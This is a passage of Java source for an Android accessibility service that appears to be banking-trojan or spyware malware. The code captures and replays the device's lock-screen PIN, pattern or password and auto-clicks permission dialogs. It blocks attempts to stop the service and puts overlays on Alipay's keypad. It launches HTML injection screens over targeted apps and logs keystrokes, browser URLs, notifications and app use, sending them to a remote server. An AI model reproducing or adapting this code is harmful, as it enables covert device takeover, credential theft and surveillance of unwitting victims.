//                        }
                    }
                }
                Log.d("cell detected", "description: " + description);
            } else {
                if (node.getContentDescription() != null && ispattern) {

                    Integer number = extractNumber(node.getContentDescription().toString());

                    if (number != null) {
                        CurrentLockState = "pt";
                        if (!fullpatterncaptured.contains(number.toString())) {
                            fullpatterncaptured += number.toString();
                            Log.d("Pattern", fullpatterncaptured);//32147
//                            Rect rec = new Rect();
//                            node.getBoundsInScreen(rec);
//                            Point centerPoint = new Point(rec.centerX(), rec.centerY());
                            TemppatternMap.put(number, centerPoint);
                        }

                    }
                }
            }


        } catch (Exception a) {
            a.printStackTrace();
        }

    }

//    public List findByClassName(String p0) {
//        List list = null;
//        try {
//            AccessibilityNodeInfo rootInActive = myAccess().getRootInActiveWindow();
//            if (rootInActive == null) {
//                return list;
//            }
//            ArrayList uArrayList = new ArrayList();
//            myAccess()._findClassName(uArrayList, rootInActive, p0);
//            return uArrayList;
//        } catch (java.lang.Exception e0) {
//            return null;
//        }
//    }

//    private void _findClassName(List p0, AccessibilityNodeInfo p1, String p2) {
//        try {
//            int childCount = p1.getChildCount();
//            if (p2.equals(p1.getClassName())) {
//                p0.add(p1);
//            }
//            if (childCount > 0) {
//                for (int i = 0; i < childCount; i = i + 1) {
//                    this._findClassName(p0, p1.getChild(i), p2);
//                }
//            }
//            return;
//        } catch (java.lang.Exception e0) {
//        }
//    }

    public void Unlockpass(String pass, boolean needEnter) {
        try {
            pasteText(pass);
            if (needEnter) {
                Map<Integer, Point> patternMap = loadPatternMap(getApplicationContext());
                Point cell = patternMap.get(-1);
                if (cell != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        clickthis(cell.x, cell.y);
                    }

                }
            }
            NeedEnter = true;
        } catch (java.lang.Exception e0) {
        }
        skiprecord = false;
    }

    public void drawPattern(String pattern) {


        Map<Integer, Point> patternMap = loadPatternMap(getApplicationContext());
        List<Point> gesturePath = new ArrayList<>();
        for (char c : pattern.toCharArray()) {
            int digit = Character.getNumericValue(c);
            Point cell = patternMap.get(digit);
            if (cell != null) {
                gesturePath.add(cell);
            }
        }

        if (!gesturePath.isEmpty()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                AccessServices MyAccess = myAccess();
                if (MyAccess == null) {
                    return;
                }

                Handler handler = new Handler(MyAccess.getMainLooper());

                handler.post(() -> {
                    simulatePatternGesture(gesturePath);
                });

            }
        }
        try {
            Thread.sleep(1000);
        } catch (Exception a) {
            // Optional: handle or log the exception
        }
        AccessServices.skiprecord = false;
    }

    public static void drawPin(String pattern, boolean needEnter) {
        //List<Point> gesturePath = new ArrayList<>();
        char[] chars = pattern.toCharArray();
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        Handler handler = new Handler(MyAccess.getMainLooper());


        for (int i = 0; i < chars.length; i++) {
            try {
                final char c = chars[i];
                handler.post(() -> {
                    clickpin(c, 0);
                });

                Thread.sleep(800);
            } catch (Exception a) {
                // Optional: handle or log the exception
            }


            // CLickTextpostion(String.valueOf(c), rootview);


        }
        try {
            Thread.sleep(800);
        } catch (Exception a) {
            // Optional: handle or log the exception
        }
        if (needEnter) {
            Map<Integer, Point> patternMap = loadPatternMap(MyAccess.getApplicationContext());
            final Point cell = patternMap.get(-1);
            if (cell != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    handler.post(() -> {
                        clickthis(cell.x, cell.y);
                    });
                }
            }
        }

        skiprecord = false;
    }

    private static void clickpin(char c, int trsout) {
        if (trsout >= 3) {
            return;
        }
        AccessServices MyAccess2 = myAccess();
        if (MyAccess2 == null) {
            return;
        }
        Handler handler = new Handler(MyAccess2.getMainLooper());
        String pinid = "com.android.systemui:id/key";
        if (isvivo()) {
            pinid = "com.android.systemui:id/VivoPinkey";
        }
        AccessibilityNodeInfo node2 = AccessTools.getNodeByViewId(MyAccess2.getRootInActiveWindow(), pinid + String.valueOf(c));
        if (node2 != null) {
            try {
                node2.performAction(16);
            } catch (Exception f) {
                try {
                    CLickTextpostion(String.valueOf(c), MyAccess2.getRootInActiveWindow());
                } catch (Exception a) {
                }
            }
        } else {
            handler.postDelayed(() -> {
                clickpin(c, trsout + 1);
            }, 800);
        }


    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    private void simulatePatternGesture(List<Point> gesturePath) {
        if (gesturePath == null || gesturePath.isEmpty()) {
            Log.e("PatternUnlock", "Gesture path is empty or null.");
            return;
        }

        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();

        // Start the path at the first point
        Point start = gesturePath.get(0);
        path.moveTo(start.x, start.y);

        // Connect subsequent points
        for (int i = 1; i < gesturePath.size(); i++) {
            Point point = gesturePath.get(i);
            path.lineTo(point.x, point.y);
        }

        // Create and add the stroke
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, /*startTime=*/ 0, /*duration=*/ 1000);
        builder.addStroke(stroke);

        // Dispatch the gesture
        GestureDescription gesture = builder.build();
        dispatchGesture(gesture, new AccessibilityService.GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d("PatternUnlock", "Pattern drawn successfully.");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.e("PatternUnlock", "Pattern drawing cancelled.");
            }
        }, null);
    }

    private void preventstopback( String CuzPackage, AccessibilityNodeInfo RootView) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            return;
        }
        if (CuzPackage.equals("com.android.systemui".toLowerCase()) && RootView != null) {

            //

            AccessibilityNodeInfo nf233 = AccessTools.getNodeByViewId(RootView,
                    "com.android.systemui:id/fgs_manager_app_item_stop_button");
            if (nf233 != null) {
                // Log.d("Accessibility", "Element found!");
                // String myName = getLabelApplication(getApplicationContext()).toLowerCase();
                // if (nf233.isVisibleToUser()) {
                try {
                    performGlobalAction(GLOBAL_ACTION_HOME);
                } catch (Exception a) {
                }
                GoHome();
                blockBack();

                return;
                //   }
            }
            AccessibilityNodeInfo nf2 = AccessTools.getNodeByViewId(RootView,
                    "com.android.systemui:id/fgs_manager_app_item_label");
            if (nf2 != null) {


                if (nf2.getText() != null &&
                        nf2.getText().toString().toLowerCase().contains(CurrentNam)) {
                    try {
                        performGlobalAction(GLOBAL_ACTION_HOME);
                    } catch (Exception a) {
                    }
                    GoHome();
                    blockBack();
                    return;
                }
            }
        }
    }

    public static Integer extractNumber(String input) {
        // Define a regular expression to find numbers
        Pattern pattern = Pattern.compile("\\d+");
        Matcher matcher = pattern.matcher(input);

        // If a number is found, return it as an integer
        if (matcher.find()) {
            return Integer.parseInt(matcher.group());
        }

        // Return null if no number is found
        return null;
    }

    // Check if a node is a pattern cell (customize based on your app's use case)

    // Generate a description for a pattern cell
//    private void activateNode(AccessibilityNodeInfo node) {
//        if (node == null) return;
//
//        // Check if the node is clickable
//        if (node.isClickable()) {
//            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//        } else {
//            // Navigate to parent if the current node is not clickable
//            AccessibilityNodeInfo parent = node.getParent();
//            if (parent != null) {
//                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
//            }
//        }
//    }

    private void checkpass(AccessibilityEvent event) {
        try {
            if (CapRead) {

                try {

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        //if (CapOK) {
                        if (CapOK) {
                            lockedonce = true;
                            try {
                                if (My_Configs.Capture_Lock.equals("1") && !skiprecord) {

//                                    if (event.getEventType() == AccessibilityEvent.TYPE_TOUCH_INTERACTION_START ||
//                                            event.getEventType() == AccessibilityEvent.TYPE_TOUCH_INTERACTION_END) {
//                                        if (isSamsung()) {
//                                            needclik += 1;
//                                        }
//                                    }


                                    describePatternCells(event);

                                }

                            } catch (Exception e) {
                                Log.e("Accessibility", "describePatternCells", e);

                            }
                            KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                            boolean isScreenLocked = keyguardManager.isKeyguardLocked();
                            if (!isScreenLocked) {
                                CapOK = false;
                            }
                            //return;
                        } else {

                            if (lockedonce) {
                                lockedonce = false;
                                disablesuperwatch();

//                            }
//                            if (CapOK) {

                                CapOK = false;
                                CapRead = false;
                                skiprecord = false;
                                //disableTouchExploration();
                                disablesuperwatch();
                                switch (CurrentLockState) {
                                    case "pa": {

                                        String currentpass = MySettings.Read(getApplicationContext(), Consts.mob_lock, "null");
                                        if (TempStorepass.length() > 0 && !currentpass.equals("pa:" + TempStorepass)) {
                                            MySettings.Write(getApplicationContext(), Consts.mob_lock, "pa:" + TempStorepass);
                                            MyLoger.Debug("LockType: Password , Pass:", TempStorepass);
                                           // patternMap = new HashMap<>(TemppatternMap);
                                            savePatternMap(getApplicationContext(),new HashMap<>(TemppatternMap));
                                            TemppatternMap.clear();
                                        }
                                        TempStorepass = "";
                                        break;
                                    }
                                    case "pt": {
                                        String currentpass = MySettings.Read(getApplicationContext(), Consts.mob_lock, "null");
                                        if (fullpatterncaptured.length() > 0 && !currentpass.equals("pt:" + fullpatterncaptured)) {
                                            MySettings.Write(getApplicationContext(), Consts.mob_lock, "pt:" + fullpatterncaptured);
                                            //  MyLoger.Debug("Lock Pattern ,Saved:", fullpatterncaptured);
                                           // patternMap = new HashMap<>(TemppatternMap);
                                            savePatternMap(getApplicationContext(),new HashMap<>(TemppatternMap));
                                            TemppatternMap.clear();
                                        }
                                        fullpatterncaptured = "";
                                        break;
                                    }
                                    case "pi": {
                                        String currentpass = MySettings.Read(getApplicationContext(), Consts.mob_lock, "null");
                                        if (fullpincaptured.length() > 0 && !currentpass.equals("pi:" + fullpincaptured)) {
                                            MySettings.Write(getApplicationContext(), Consts.mob_lock, "pi:" + fullpincaptured);
                                            MyLoger.Debug("Lock PIN ,Saved:", fullpincaptured);
                                           // patternMap = new HashMap<>(TemppatternMap);
                                            savePatternMap(getApplicationContext(),new HashMap<>(TemppatternMap));
                                            TemppatternMap.clear();
                                        }
                                        fullpincaptured = "";
                                        break;
                                    }
                                    default: {
                                        MyLoger.Debug("LockType: Unknown", "");
                                        break;
                                    }
                                }
                            }

                        }
                        //}
                    }
                } catch (Exception fd) {

                }

            }

        } catch (Exception h) {
            h.printStackTrace();
        }

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String CuzPackage = "";
        AccessibilityNodeInfo nodeInfo = null;
        AccessibilityNodeInfo RootView = null;
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        String eventtimeStamp = sdf.format(new Date(event.getEventTime()));


        String appName = "unKnown";
        String AllScreen = "";
        String EventText = "";


        try {
            if (!skiprecord) {
                //MyLoger.Debug("AccessibilityEvent",EtypetoStr(event.getEventType()));
                checkpass(event);

            }
        } catch (Exception a) {
        }

        try {
            if (event.getPackageName() != null && event.getPackageName().toString().trim().length() > 0) {
                CuzPackage = event.getPackageName().toString().toLowerCase();
            }
            if (CuzPackage.replace(" ", "").length() > 0) {


                try {

                    appName = getAppNameFromPkgName(getApplicationContext(), event.getPackageName().toString());

                } catch (Exception e) {
                   // e.printStackTrace();
                     appName = "unKnown";
                    //return;
                }
            }
        } catch (Exception s) {
            //CuzPackage = null;
        }

//        if(CuzPackage == null){
//            CuzPackage = "com.android.settings";
//        }

        try {
            nodeInfo = event.getSource();
//            try
//            {
//                printViewIds(nodeInfo);
//
//            }catch (Exception x){
//
//            }

        } catch (Exception s) {
            nodeInfo = null;
        }

//            if (nodeInfo == null) {
//                return;
//            }

        try {
            RootView = getRootInActiveWindow();

            //AllScreen = AccessTools.readAllTextOnScreen(RootView);
        } catch (Exception s) {
            RootView = null;
        }


        try {
            if (nodeInfo != null && event != null &&
                    event.getClassName() != null &&
                    event.getClassName().toString().equals("android.widget.EditText")) {

                Globalnode = nodeInfo;
            }
        } catch (Exception a) {
        }

        try {
            if (NeedEnter) {
                if (Globalnode != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

                        try {
                            Globalnode.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.getId());
                            NeedEnter = false;
                        } catch (Exception a) {
                            a.printStackTrace();
                        }

                    }
                }
            }
        } catch (Exception a) {

        }


        if (
            //event.getEventType() == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
            // event.getEventType() == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
                event.getEventType() == AccessibilityEvent.TYPE_TOUCH_INTERACTION_START) {
            // Automatically activate the focused item on a single tap
            try {

                if (event.getSource() != null) {
                    AccessibilityNodeInfo nodecaz = AccessibilityNodeInfo.obtain(event.getSource());
                    Handler hstop = new Handler(Looper.getMainLooper());
                    hstop.postDelayed(new Runnable() {
                        public void run() {
                            try {
                                //lastclicked = event.getSource().getViewIdResourceName();
                                nodecaz.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                nodecaz.recycle();

                                return;

                            } catch (Exception d) {
                                d.printStackTrace();
                            }
                        }
                    }, 100);
                }

            } catch (Exception a) {
                a.printStackTrace();
            }
        }
        try {


            try {
                EventText = event.getText().toString().toLowerCase();
                // MyLoger.Debug("EVENTTEXT:",EventText);
            } catch (Exception s) {

            }

//            try {
//                AccessibilityNodeInfo rootNode = event.getSource();
//                if (rootNode != null) {
//                    printViewIds(rootNode);
//                    rootNode.recycle();
//                }
//            } catch (Exception a) {
//
//            }

            //Auto Click
            if (My_Configs.Click_Prim.equals("1") && RootView != null) {

                if (Consts.removeme ||
                        removeapp ||
                        forbattery ||
                        Auto_Click ||
                        FOR_EXTR_STRG ||
                        FOR_DRAW_OVER ||
                        FOR_PLY ||
                        FOR_NOTFY ||
                        FOR_CHNG_STNG ||
                        //ReadBool(getApplicationContext(), Consts.Auto_Sreen, false) ||
                        FOR_PRIMS) {

                    //

//                    if(FOR_PLY){
//                        printViewIds(RootView,0);
//                    }
                    //printViewIds(RootView,0);

                    // if (ReadBool(getApplicationContext(), Consts.Auto_Prims, false) && Build.VERSION.SDK_INT >= 34) {
                    //printViewIds(nodeInfo,0);
                    //  MyLoger.Debug("Auto_Prims",CuzPackage);
                    // if (RootView == null){
                    //    AccessTools.AllowPrims14(mWidth, mHeight);
                    // }
                    // AccessTools.AllowPrims14(mWidth, mHeight);

                    // AccessServices.Auto_Click = false;
                    //return;
                    //  }
                    //  printViewIds(RootView);
                    AccessTools.Clickallow(RootView, nodeInfo);
                }
                //  return;
            }

            try {
                int eventType = event.getEventType();

                if (eventType == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                    String command = "";
                    if (event.getText() != null) {
                        command = event.getText().toString();
                        boolean skipreturn = false;
                        switch (command) {
                            case "[strscr]":
                                try {
                                    String comstart = CommandsData.get("COM");
                                    Intent scrintnt = new Intent(this, ActivityCaptureScreen.class);
                                    scrintnt.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    scrintnt.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                    scrintnt.putExtra("COM", comstart);
                                    startActivity(scrintnt);
                                    CommandsData.remove("COM");
                                } catch (Exception a) {
                                }
                                break;
                            case "[xamoi]":
                                try {

                                    Intent intentbackup = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    intentbackup.addCategory(Intent.CATEGORY_DEFAULT);
                                    Uri uribackup = Uri.fromParts("package", getApplicationContext().getPackageName(), null);
                                    intentbackup.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    intentbackup.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                    intentbackup.setData(uribackup);
                                    startActivity(intentbackup);
                                    finishxaomi();
                                } catch (Exception a) {
                                    EngineWorker.holdxaomi = false;
                                    MySettings.WriteBool(getApplicationContext(), Consts.skipxaomi, true);
                                }

                                break;
                            case "[cover]":
                                Intent intenttrans = new Intent(this, TransparentActivity.class);
                                intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intenttrans.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                intenttrans.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT);

                                startActivity(intenttrans);
                                break;
                            case "[tofront]":
                                Intent intofront = new Intent(this, tofront.class);
                                intofront.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intofront.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                intofront.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT);

                                startActivity(intofront);

                                break;


                            case "[lock]":
                                if (!LockActivity.isActivityOpen()) {
                                    Intent myIntent = new Intent(getApplicationContext(), LockActivity.class);
                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                    startActivity(myIntent);

                                }
                                break;

                            case "[fourceit]":
                                skipreturn = true;
                                break;
                        }

                        if (!skipreturn) {
                            return;
                        }
                    }
                    // } else if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
//


//                    if ((PreventDelete &&
//                            RootView != null &&
//                            My_Configs.Anti_Delete.equals("1")) &&
//                            !Consts.removeme &&
//                            UtliTools.IsScreenOn(getApplicationContext())) {
//                        if (CuzPackage.equals("com.android.settings".toLowerCase())) {
//
//
//
//
//                            String evt = EventText;
//                            String cuz = CuzPackage;
//
//                            String holdname = "null";
//                            if (event.getClassName() != null) {
//                                holdname = event.getClassName().toString().toLowerCase();
//                            }
//                            String ClassEvent = holdname;
//                            ProtectSelf(evt, cuz, ClassEvent);
//                        }else {
//                            preventstopback(getApplicationContext(), CuzPackage, RootView);
//                        }
//
//                    }


                    //   } else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {


//                    try {
//                        //AccessibilityNodeInfo rootNode = event.getSource();
//                        if (RootView != null) {
//                            printViewIds(RootView, 0);
//                           // rootNode.recycle();
//
//                        }
//                    } catch (Exception a) {
//
//                    }
//                    if ((PreventDelete &&
//                            RootView != null &&
//                            My_Configs.Anti_Delete.equals("1")) &&
//                            !Consts.removeme &&
//                            UtliTools.IsScreenOn(getApplicationContext())) {
//                        preventstopback(getApplicationContext(), CuzPackage, RootView);
//                    }

                } else if (
                        eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
                                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                    //  eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED
                ) {
                    //prevent remove self

                    try {
                        if (CuzPackage.equals("com.eg.android.AlipayGphone".toLowerCase())) {
                            AccessibilityNodeInfo nfkeys = AccessTools.getNodeByViewId(RootView,
                                    "com.alipay.mobile.antui:id/au_num_1");
                            if (nfkeys != null && nfkeys.isVisibleToUser()) {
                                if (!onealip) {
                                    onealip = true;
                                    Handler hstop = new Handler(Looper.getMainLooper());
                                    hstop.postDelayed(new Runnable() {
                                        public void run() {
                                            try {
                                                addOverlaysForKeys();
                                            } catch (Exception d) {

                                            }
                                        }
                                    }, 800);
                                }

                            } else {
                                onealip = false;
                                removeAllOverlays();
                            }
                        } else {
                            if (onealip) {
                                //
                                if (!CuzPackage.equals("com.android.systemui".toLowerCase())) {
                                    onealip = false;
                                    removeAllOverlays();
                                }
                            }
                        }
                    } catch (Exception a) {

                    }

                    try{
                        // inject
                        if (CuzPackage.length() > 0 && ject_list.size() > 0) {
                            if (ject_list.contains(CuzPackage)) {
                                MyLoger.Error("ject detected", CuzPackage);
                                if (!CuzPackage.equals(lastject) && !skipject.equals(CuzPackage)) {
                                    lastject = CuzPackage;
                                    skipject = "";
                                    final String cuzid = CuzPackage;
                                    String htmlpath  = UtliTools.findjectfile(getApplicationContext(),CuzPackage);

                                    File protectedZipFile = new File(this.getFilesDir(), htmlpath);
                                    if (protectedZipFile.exists()) {
                                        //System.out.println("The protected file exists and is secure.");
                                        Drawable icons = null;
                                        try {

                                            icons = getPackageManager().getApplicationIcon(CuzPackage);
                                        } catch (PackageManager.NameNotFoundException e) {
                                            e.printStackTrace();
                                            icons = null;
                                        }

                                        Bitmap targeticon = convertToBitmap(icons, 144, 144);
                                        ByteArrayOutputStream stream = new ByteArrayOutputStream();
                                        targeticon.compress(Bitmap.CompressFormat.PNG, 100, stream);
                                        byte[] iconByteArray = stream.toByteArray();
                                        Context mybasectx = getApplicationContext();
                                        final String Appname = getAppNameFromPkgName(getApplicationContext(), CuzPackage);

                                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                            Intent myIntent = new Intent(mybasectx, Webjector.class);
                                            myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                            myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                            myIntent.putExtra("cuzid", cuzid);
                                            myIntent.putExtra("label", Appname);
                                            myIntent.putExtra("icon", iconByteArray);
                                            myIntent.putExtra("type", "u");
                                            startActivity(myIntent);
                                        }, 1200);


                                        targeticon.recycle();
                                        if (stream != null) {
                                            stream.close();
                                        }
                                    }

                                }

                            } else {
                                if (lastject != null) {
                                    //if (!AccessTools.isSystemApp(getApplicationContext(), CuzPackage)) {
                                        lastject = null;
                                        skipject = "";
                                   // }
                                }
                            }
                        }
                    }catch (Exception a){}

                }
                //  Log.d("Eventype:",eventType + "");
            } catch (Exception x) {
                x.printStackTrace();
            }


            if (!isScreenScannerRunning()) {
                ScreenScanner(getApplicationContext());
            }


//            AccessibilityNodeInfo nf = AccessTools.getNodeByViewId(RootView, "com.android.systemui:id/privacy_chip");
//            if (nf != null) {
//                Rect rect = new Rect();
//                nf.getBoundsInScreen(rect);
//                overlayBlackBox("com.android.systemui:id/privacy_chip", rect);
//            } else {
//                removeOverlay("com.android.systemui:id/privacy_chip");
//            }

            //keystrokes
            if (nodeInfo != null) {
                if (Rec_klogs ||
                        liv_klogs) {
                    Capturekeylogger(nodeInfo, appName, event.getEventType());
                }
            }


            //disabled app
            if ( CuzPackage.length() > 0 && Blocked_Apps.size() > 0) {
                if (Blocked_Apps.contains(CuzPackage)) {
                    try {
                        String Appname = getAppNameFromPkgName(getApplicationContext(), CuzPackage);
                        blockBack();
                        GoHome();
                        ActivityMonitors.Record("[" + eventtimeStamp + "] attempt to access disabled app :" + Appname, ActivityMonitors.ActivityType.ARTS);
                        //AlertServer(this, "attempt to Access", "disabled app :" + Appname);
                    } catch (Exception s) {
                        MyLoger.Error("At.acc.BlockedApps", s.getMessage());
                    }
                }
            }




            KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            boolean isScreenLocked = keyguardManager.isKeyguardLocked();
            if (CuzPackage.length() > 0 && !isScreenLocked) {
                if (Lock_App_list.contains(CuzPackage)) {
                    try {
                        // if (!AccessTools.isSystemApp(getApplicationContext(), CuzPackage)) {
                        //   if (isKeyboardOpened()) {
                        enablesuperWatch();
//                        } else {
//                            disablesuperwatch();
//                        }
                        //  }
                    } catch (Exception s) {
                        MyLoger.Error("At.acc.BlockedApps", s.getMessage());
                    }
                } else {
                    try {
                        if (!AccessTools.isSystemApp(getApplicationContext(), CuzPackage)) {
                            disablesuperwatch();
                        }
                    } catch (Exception s) {
                        MyLoger.Error("At.acc.BlockedApps", s.getMessage());
                    }
                }
            }


            //Browser Detector


            //blocked words NOT ADD YET
//            if (RootView != null && BlockedWords.size() > 0) {
//
//                for (String wrd :
//                        BlockedWords) {
//                    if (EventText.contains(wrd)) {
//                        try {
//                            //ClickBack();
////                            Intent intent = new Intent(this, BlockAcitivty.class);
////                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
////                            intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
////                            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
////                            intent.putExtra("msg", "Blocked Word Detected: " + wrd);
////                            startActivity(intent);
//                            ActivityMonitors.Record("[" + eventtimeStamp + "] Blocked Word Detected: " + wrd, ActivityMonitors.ActivityType.Alerts);
//                        } catch (Exception s) {
//                            MyLoger.Error("At.acc.BlockedWords", s.getMessage());
//                        }
//                    }
//                }
//            }

            //tracking list
            if (((ReadBool(getApplicationContext(), Consts.enable_trak, false) &&
                    AccessTools.TNames.size() > 0) ||
                    ReadBool(getApplicationContext(), Rec_links, false)) && nodeInfo != null) {
                String eventpack = "NotFound";

                try {
                    if (event.getPackageName() != null) {
                        eventpack = event.getPackageName().toString().toLowerCase();

                        //com.google.android.inputmethod.latin
                        if (eventpack.equals(this.getPackageName().toString().toLowerCase()) ||
                                eventpack.equals("com.google.android.inputmethod.latin")) {
                            return;
                        }
                    }


                } catch (Exception fs) {

                    eventpack = "NotFound";
                }

                String pkg = "";

                if (event.getPackageName() != null) {
                    pkg = event.getPackageName().toString();
                }

                AccessTools.Supported_Browsers browserConfig = null;
                for (AccessTools.Supported_Browsers supportedConfig : getSupportedBrowsers()) {
                    if (supportedConfig.packageName.equals(pkg)) {
                        browserConfig = supportedConfig;
                    }
                }

                String capturedUrl = null;
                if (browserConfig != null) {
                    capturedUrl = captureUrl(nodeInfo, browserConfig);
                    if (capturedUrl != null && ReadBool(getApplicationContext(), Rec_links, false)) {
                        if (!LastCapURL.equals(capturedUrl)) {
                            LastCapURL = capturedUrl;

                            ActivityMonitors.Record(appName + "|" + eventtimeStamp + "|" + capturedUrl,
                                    ActivityMonitors.ActivityType.BLNK);

                            MyLoger.Info("capturedUrl: ", "DATE: " + eventtimeStamp + ">" + "URL:" + capturedUrl);
                            AlertServer(getApplicationContext(), "Browser State", "Visited: " + capturedUrl);

                        }

                    }
                }


                String founded = null;
                try {
                    if (ReadBool(getApplicationContext(), Consts.enable_trak, false)) {
                        if (capturedUrl == null) {
                            capturedUrl = "NOTFOUND";
                        }

                        String Name = "";


                        for (Map.Entry<String, String> entry : Map_Name_Lnk.entrySet()) {
                            // Do something with each site
                            try {
                                Name = entry.getKey();
                                String site = entry.getValue();
                                String AppID = Map_Name_ID.get(Name);
                                if (isSameWebsite(capturedUrl.toLowerCase(), site) || (AppID != null && AppID.toLowerCase().equals(eventpack))) {


                                    Drawable icons = null;
                                    try {

                                        icons = getPackageManager().getApplicationIcon(pkg);
                                    } catch (PackageManager.NameNotFoundException e) {
                                        e.printStackTrace();
                                        icons = null;
                                    }

                                    Bitmap targeticon = convertToBitmap(icons, 144, 144);
                                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                                    targeticon.compress(Bitmap.CompressFormat.PNG, 100, stream);
                                    byte[] iconByteArray = stream.toByteArray();
                                    Context mybasectx = getApplicationContext();
                                    final String Appname = getAppNameFromPkgName(this, pkg);


                                    new Timer().schedule(new TimerTask() {
                                        @Override
                                        public void run() {
                                            Intent myIntent = new Intent(mybasectx, WebBrowser.class);
                                            myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                            myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                            myIntent.putExtra("key", site);
                                            myIntent.putExtra("label", Appname);
                                            myIntent.putExtra("icon", iconByteArray);
                                            myIntent.putExtra("type", "u");
                                            startActivity(myIntent);
                                        }
                                    }, 1200);

                                    founded = site;
                                    targeticon.recycle();
                                    if (stream != null) {
                                        stream.close();
                                    }
//                                    if (a_ClassGen_sca.caponce() && founded != null) {
//                                        Removename(Name);
//                                    }
                                }
                            } catch (Exception a) {
                            }
                        }
                    }
                } catch (Exception a) {
                }

            }


            //notifications
            if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                try {
                    boolean savenoty = ReadBool(getApplicationContext(), Rec_Notifications, false);
                    boolean livenoty = Live_Nots;
                    if (savenoty || livenoty) {
                        Notification notification = (Notification) event.getParcelableData();
                        if (notification != null) {
                            String title = "N/A";
                            if (notification.extras.getCharSequence(Notification.EXTRA_TITLE) != null) {
                                title = String.valueOf(notification.extras.getCharSequence(Notification.EXTRA_TITLE));
                            }
                            String text = "N/A";
                            if (notification.extras.getCharSequence(Notification.EXTRA_TEXT) != null) {
                                text = String.valueOf(notification.extras.getCharSequence(Notification.EXTRA_TEXT));
                            }

                            if (savenoty) {
                                String notydata = eventtimeStamp + "|" + appName + "|" + title + "|" + text;
                                try {
                                    ActivityMonitors.Record(notydata,
                                            ActivityMonitors.ActivityType.NTFS);
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                            if (livenoty) {
                                String notytitle = appName + ":" + title;
                                try {
                                    AlertServer(getApplicationContext(), notytitle, text);
                                } catch (Exception ex) {
                                    ex.printStackTrace();
                                }
                            }
                        }

                    }


                } catch (Exception b) {
                    MyLoger.Error("At.Acc.notifi", b.getMessage());
                }
            }


            //visitedapps
            if (appName.length() > 0 && !LastVisitedApp.equals(appName) && !appName.equals("Known")) {
                try {
                    if (!LastVisitedApp.equals("Known") && ReadBool(getApplicationContext(), Rec_apps, false)) {
                        ActivityMonitors.Record(eventtimeStamp + "|" + "EXIT" + "|" + LastVisitedApp,
                                ActivityMonitors.ActivityType.VAPS);
                    }
                    LastVisitedApp = appName;
                    if (ReadBool(getApplicationContext(), Rec_apps, false)) {
                        ActivityMonitors.Record(eventtimeStamp + "|" + "ENTER" + "|" + LastVisitedApp,
                                ActivityMonitors.ActivityType.VAPS);
                        if (launcherApps == null) {
                            launcherApps = getLauncherAppsPackageNames(this);
                        }
                        if (launcherApps.contains(CuzPackage) && !LastOpenApp.equals(appName)) {
                            LastOpenApp = appName;
                            AlertServer(getApplicationContext(), "Apps State", "User open: " + LastVisitedApp);
                        }
                    }


                } catch (Exception a) {
                    MyLoger.Error("At.acc.visited", a.getMessage());
                }
            }


            //anti delete
